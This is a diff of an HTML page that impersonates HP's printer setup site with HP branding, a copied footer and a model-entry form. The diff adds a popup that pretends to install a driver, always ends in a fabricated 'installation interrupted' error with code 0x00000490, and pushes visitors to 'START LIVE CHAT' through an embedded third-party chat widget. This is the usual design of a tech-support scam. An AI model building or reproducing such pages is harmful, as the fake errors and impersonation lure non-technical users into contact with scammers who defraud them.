@@ -1,236 +1,161 @@
 <!DOCTYPE html>
-<html lang="en"><head>
-
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="HP Printer Setup and driver support."><title>HP Printer Setup | Printer Setup</title>
-    <link rel="stylesheet" href="style.css"></head>
-    <style>
-        
-.hp-setup {
-  padding: 65px 0;
-  background: #f0f6ff;
-}
-
-.hp-container {
-  width: min(1120px, 90%);
-  margin: auto;
-}
-
-.hp-content {
-  max-width: 650px;
-  margin-bottom: 35px;
-}
-
-.hp-label {
-  color: #2468c9;
-  font-size: 12px;
-  font-weight: 700;
-  letter-spacing: 2px;
-}
-
-.hp-content h1 {
-  color: #193d70;
-  font-size: clamp(32px, 4vw, 46px);
-  line-height: 1.2;
-  margin: 12px 0;
-}
-
-.hp-content p {
-  color: #52677f;
-  font-size: 16px;
-  line-height: 1.8;
-}
-
-.hp-button {
-  display: inline-block;
-  padding: 13px 25px;
-  margin-top: 12px;
-  border-radius: 30px;
-  background: #2468c9;
-  color: white;
-  text-decoration: none;
-  font-weight: 700;
-}
-
-.hp-button:hover {
-  background: #193d70;
-}
-
-.hp-image img {
-  display: block;
-  width: 100%;
-  max-width: 700px;
-  margin: auto;
-  height: auto;
-  object-fit: contain;
-}
-
-.hp-install {
-  padding: 65px 0;
-  background: white;
-}
-
-.hp-install-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  align-items: center;
-  gap: 45px;
-}
-
-.hp-install h2 {
-  color: #193d70;
-  font-size: 29px;
-}
-
-.hp-install p {
-  color: #52677f;
-  line-height: 1.8;
-}
-
-.hp-install a {
-  color: #2468c9;
-  font-weight: 700;
-}
-
-.hp-install img {
-  width: 100%;
-  height: auto;
-  object-fit: contain;
-}
-
-
-
-
-.hp-container {
-  width: min(1120px, 90%);
-  margin: auto;
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  align-items: center;
-  gap: 40px;
-}
-
-.hp-content {
-  max-width: 650px;
-  margin-bottom: 0;
-}
-
-.hp-image {
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-
-.hp-image img {
-  display: block;
-  width: 100%;
-  max-width: 500px;
-  height: auto;
-  object-fit: contain;
-}
-
-@media (max-width: 700px) {
-  .hp-container {
-    grid-template-columns: 1fr;
-    gap: 25px;
-  }
-}
-
-
-@media (max-width: 700px) {
-  .hp-setup,
-  .hp-install {
-    padding: 40px 0;
-  }
-
-  .hp-install-grid {
-    grid-template-columns: 1fr;
-    gap: 25px;
-  }
-
-  .hp-install h2 {
-    font-size: 24px;
-  }
-}
-
-    </style>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Set up your HP printer and find printer software and drivers.">
+  <title>Set Up Your HP Printer</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
 <body>
-<header class="site-header"><div class="container nav-wrap"> <a class="brand" href="index.html">
-  <img src="hp.png" alt="Printer Setup Logo">
-  <span>HP</span>
-</a><button class="menu-toggle" aria-label="Toggle navigation" aria-expanded="false">☰</button><nav class="nav-links"><a href="index.html">Home</a><a href="index.html#brands">Printer Brands</a><a href="index.html#services">Services</a><a href="index.html#faq">FAQs</a><a class="nav-cta" href="#brand-support">Get Support</a></nav></div></header>
-<main>
+<header class="site-header">
+  <div class="header-inner">
+    <a class="hp-logo" href="#top" aria-label="HP home">
+      <img src="https://gallerypng.com/wp-content/uploads/2024/07/original-hp-logo-png-image.png" alt="HP logo">
+    </a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="index.html">Home</a><a href="#inkjet">Inkjet</a><a href="#laser">Laser</a><a href="#envy">Envy</a>
+    </nav>
+  </div>
+</header>
+<main id="top">
+  <section class="hero">
+    <div class="hero-inner">
+      <div class="hero-copy">
+        <h1>Set Up Your HP Printer</h1>
+        <p>Enter your HP product name and model number to get the right HP Smart software and drivers for you.</p>
+        <!-- <form class="model-form" id="hpModelForm">
+          <label class="sr-only" for="printerModel">Enter your HP printer model</label>
+          <input id="printerModel" name="printerModel" type="text" placeholder="
+  
+        HP Color LaserJet Pro M254dw" required>
+          <button type="submit">Next</button>
+        </form> -->
 
-<section class="hp-setup">
-  <div class="hp-container">
-    <div class="hp-content">
-      <p class="hp-label">HP PRINTER SUPPORT</p>
 
-      <h1>Set up your HP printer</h1>
 
-      <p>
-        Enter your HP product name and model number
-        to find the right software and drivers for your printer.
-      </p>
 
-      <!-- <a
-        href="https://support.hp.com/"
-        class="hp-button"
-        target="_blank"
-        rel="noopener noreferrer"
-      >
-        Find Your Printer
-      </a> -->
+        <form class="model-form" id="hpModelForm">
+  <label class="sr-only" for="printerModel">
+    Enter your HP printer model
+  </label>
 
-    
-<form class="hp-hero-form" id="hpHeroForm">
   <input
+    id="printerModel"
+    name="printerModel"
     type="text"
-    id="hpHeroModel"
-    placeholder="Enter your printer model"
+    placeholder="HP Color LaserJet Pro M254dw"
     required
   >
-  <button type="submit">Submit</button>
+
+  <button type="submit">Next</button>
 </form>
-
+      </div>
+      <div class="hero-printer">
+        <img src="https://tse4.mm.bing.net/th/id/OIP.rSr-M56lnFxe3oC9u6WFFgHaFN?r=0&pid=Api&h=220&P=0" alt="HP printer printing a photo">
+      </div>
     </div>
-
-    <div class="hp-image">
-      <img
-        src="https://demartelectslr.online/service/printing-services/hp/hp-img/images/printer-new.png"
-        alt="HP printer setup"
-      >
+  </section>
+  <section class="install-section">
+    <div class="install-inner">
+      <div class="install-copy">
+        <h2>Install HP Smart software and drivers</h2>
+        <p>Install HP Smart software and drivers on each mobile device or computer you want to print from. Add the printer on the new device.</p>
+        <p>Need additional help with setup? Visit <a href="#top" class="support-link">HP Support</a>.</p>
+      </div>
+      <div class="install-printer">
+        <img src="hp printer.jpg" alt="HP all-in-one printer">
+      </div>
     </div>
-  </div>
-</section>
-
-<section class="hp-install">
-  <div class="hp-container hp-install-grid">
-    <div>
-      <h2>Install HP Smart software and drivers</h2>
-
-      <p>
-        Install HP Smart software and drivers on each mobile
-        device or computer you want to print from. Add the
-        printer on the new device.
-      </p>
-
-      <p>
-        Need additional help with setup?
-        Visit
-        <a href="https://support.hp.com/"
-           target="_blank"
-           rel="noopener noreferrer">
-          HP Support
-        </a>.
-      </p>
-    </div>
-
-    <img
-      src="https://demartelectslr.online/service/printing-services/hp/hp-img/images/printer-setup.png"
-      alt="Printer setup instructions"
-    >
-  </div>
-</section>
-
+  </section>
 </main>
-<footer class="footer"><div class="container footer-inner"><a class="brand footer-brand" href="index.html">Printer <span>Setup</span></a><p>Printer setup information for home and office users.</p><p class="copyright">© 2026 Printer Setup. All rights reserved.</p></div></footer><script src="script.js"></script></body></html>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-columns">
+      <div class="footer-column"><h3>About Us</h3><a href="#top">Contact HP</a><a href="#top">Careers</a><a href="#top">Investor relations</a><a href="#top">Sustainable impact</a><a href="#top">Press center</a><a href="#top">The Garage</a></div>
+      <div class="footer-column"><h3>Ways To Buy</h3><a href="#top">Shop online</a><a href="#top">Call an HP rep</a><a href="#top">Find a reseller</a><a href="#top">Enterprise store</a><a href="#top">Public sector purchasing</a></div>
+      <div class="footer-column"><h3>Support</h3><a href="#top">Download drivers</a><a href="#top">Support &amp; troubleshooting</a><a href="#top">Community</a><a href="#top">Register your product</a><a href="#top">Authorized service providers</a><a href="#top">Check repair status</a><a href="#top">Training &amp; certification</a><a href="#top">Fraud alert</a><a href="#top">Security Center</a></div>
+      <div class="footer-column"><h3>HP Partners</h3><a href="#top">HP Amplify Partner Program</a><a href="#top">HP Partner Portal</a><a href="#top">Developers</a></div>
+      <div class="footer-column"><h3>Useful Links</h3><a href="#top">Recalls</a><a href="#top">Product recycling</a><a href="#top">Accessibility</a><a href="#top">CA Supply Chains Act</a><a href="#top">Site Map</a><a href="#top">Privacy</a><a href="#top">Use of cookies</a><a href="#top">Personal data rights</a><a href="#top">Terms of use</a><a href="#top">Limited warranty statement</a><a href="#top">Terms &amp; conditions of sales &amp; service</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p class="copyright">◆ Copyright All Right Reserved.</p>
+      <form class="subscribe-form" id="subscribeForm">
+        <label class="sr-only" for="emailAddress">Your email address</label>
+        <input type="email" id="emailAddress" placeholder="Your Email address" required>
+        <button type="submit">SUBSCRIBE</button>
+      </form>
+    </div>
+  </div>
+</footer>
+
+
+
+
+
+
+
+<!-- Installation Preview Popup -->
+<div class="driver-modal" id="driverModal" aria-hidden="true">
+  <div class="driver-modal-box" role="dialog" aria-modal="true"
+       aria-labelledby="driverModalTitle">
+
+    <button type="button" class="driver-close" id="driverClose"
+            aria-label="Close popup">&times;</button>
+
+    <div id="driverProgressView">
+      <p class="driver-status">Software is downloaded or installed</p>
+
+      <h2 id="driverModalTitle">Printer Driver Installation Preview</h2>
+      <p class="driver-model" id="driverModelName">HP printer</p>
+
+      <p class="driver-simulating" id="driverStatusText">
+        Simulating driver installation…
+      </p>
+
+      <div class="driver-progress-track">
+        <div class="driver-progress-fill" id="driverProgressFill"></div>
+      </div>
+
+      <p class="driver-progress-number" id="driverProgressNumber">0%</p>
+    </div>
+
+    <div id="driverErrorView" hidden>
+      <div class="driver-error-icon">!</div>
+      <h2 class="driver-error-title">Printer Driver Installation Interrupted</h2>
+
+      <p>
+        An error occurred while attempting to install the printer driver.
+      </p>
+
+      <ul class="driver-error-details">
+        <li><strong>Error:</strong> Installation could not be completed.</li>
+        <li><strong>Error Code:</strong> 0x00000490</li>
+        <li><strong>Status:</strong> Printer connection and driver installation have not been verified.</li>
+      </ul>
+
+      <h3 class="driver-support-heading">SUPPORT OPTIONS</h3>
+      <p class="driver-support-message">Need Help? Contact Support</p>
+
+      <button type="button" class="driver-chat-button" id="driverChatButton">
+        START LIVE CHAT
+      </button>
+    </div>
+
+  </div>
+</div>
+
+
+<script src="/popup.js"></script>
+
+
+<script type='text/javascript'>
+var onWebChat={ar:[], set: function(a,b){if (typeof onWebChat_==='undefined'){this.ar.
+push([a,b]);}else{onWebChat_.set(a,b);}},get:function(a){return(onWebChat_.get(a));},
+w:(function(){ var ga=document.createElement('script'); ga.type = 'text/javascript';
+ga.async=1;ga.src=('https:'==document.location.protocol?'https:':'http:') + 
+'//www.onwebchat.com/clientchat/9d0cf6f6f0f611356cc5a4c91b7046b9';var s=
+document.getElementsByTagName('script')[0];s.parentNode.insertBefore(ga,s);})()}
+</script>
+</body>
+</html>
